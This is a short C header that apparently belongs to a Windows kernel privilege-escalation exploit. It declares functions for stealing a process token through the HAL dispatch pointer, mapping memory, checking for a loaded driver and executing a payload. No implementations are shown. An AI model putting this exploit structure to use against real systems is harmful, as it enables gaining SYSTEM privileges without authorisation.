#ifndef _KERNEL_H
#define _KERNEL_H

#include "windefs.h"

typedef struct _MemMapping
{
	HANDLE mapping;
	LPBYTE buffer;
} MemMapping;

BOOL was_token_replaced();
BOOL prepare_for_kernel();
VOID steal_process_token();
VOID hal_dispatch_steal_process_token();
ULONG_PTR get_hal_dispatch_pointer();
DWORD get_page_size();
BOOL create_anon_mapping(MemMapping* memMap);
VOID destroy_anon_mapping(MemMapping* memMap);
VOID invoke_hal_dispatch_pointer();
BOOL is_driver_loaded(wchar_t* driverName);
DWORD execute_payload(LPVOID lpPayload);

#endif
